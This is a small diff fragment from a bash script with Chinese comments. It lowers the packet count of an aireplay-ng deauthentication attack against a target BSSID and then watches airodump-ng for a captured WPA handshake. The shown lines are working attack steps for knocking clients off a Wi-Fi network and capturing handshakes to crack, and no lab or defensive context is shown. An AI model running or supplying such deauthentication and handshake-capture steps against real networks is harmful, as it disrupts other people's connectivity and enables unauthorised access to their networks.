@@ -69,7 +69,7 @@ while true; do
     ELAPSED_TIME=0
   
     echo "发送去认证请求..."
-    aireplay-ng -0 100 -a $BSSID wlan0mon &
+    aireplay-ng -0 10 -a $BSSID wlan0mon &
     AIREPLAY_PID=$!
   
     # 使用 while 循环监控 airodump-ng 进程，检查是否找到握手包
